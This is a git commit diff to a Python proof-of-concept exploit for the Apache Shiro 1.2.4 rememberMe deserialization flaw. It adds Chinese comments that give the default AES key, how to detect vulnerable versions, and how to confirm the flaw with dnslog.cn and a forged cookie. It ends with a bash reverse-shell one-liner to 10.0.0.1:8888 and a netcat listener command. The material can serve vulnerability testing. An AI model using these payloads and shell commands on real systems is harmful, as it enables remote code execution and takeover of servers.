252690e77f0424fed4bd91fc0fcf7b2806458978
liudyixia <liudyixia@liudyixiadeMacBook-Pro.local>
2019-12-31 20:33:21 +0800

    “update”

--- ShiroRememberMe1.2.4反序列化漏洞/ShiroRememberMe1.2.4POC.py
+++ ShiroRememberMe1.2.4反序列化漏洞/ShiroRememberMe1.2.4POC.py
@@ -41,10 +41,22 @@ if __name__ == '__main__':
     printpayload(command="ping f4qe0k.dnslog.cn")
 
 '''
+漏洞说明
+Apache Shiro在Java的权限及安全验证框架中占有重要的一席之地，在它编号为005的issue中爆出严重的Java反序列化漏洞。
+Shiro在使用中存在一个名为rememberMe的Cookie，该Cookie中的值是base64编码形式，由数据通过AES（IV、CBC）加密生成，该值在传到服务端后，会对该值进行反序列换操作。
+AES加密的IV可以是随机的，密钥采用固定密钥：kPH+bIxk5D2deZiIxcaaaA==
+
+漏洞检测
+
+首先找到存在问题的Shiro框架应用，如果条件允许，则通过服务器后台，搜索shiro的jar包，查看版本，版本 <= 1.2.4 均会存在问题
+在通过前台拦截访问请求，检查是否存在rememberMe cookie, 在本次业务中，发现响应有返回设置rememberMe，但是设置过期了，在请求中无法发现该cookie。
+
+复现过程：
 1、访问http://dnslog.cn/
 2、点击页面上的Get SubDomain就会给你分配一个随机的域名
 3、点击页面上的Refresh Record就会刷新查询记录
 4、在目标机器上运行"ping 你的随机域名"，这个网站点击Refresh Record就能看到记录
-
 利用的办法就是使用截包工具来修改数据包在cookie里面加一个“rememberMe=XXXXX”，注意别忘了各个cookie之间的";"
 '''
+#反弹shell命令： bash -i >& /dev/tcp/10.0.0.1/8888 0>&1
+#nc监听shell： nc -l -p 8888 -vvv
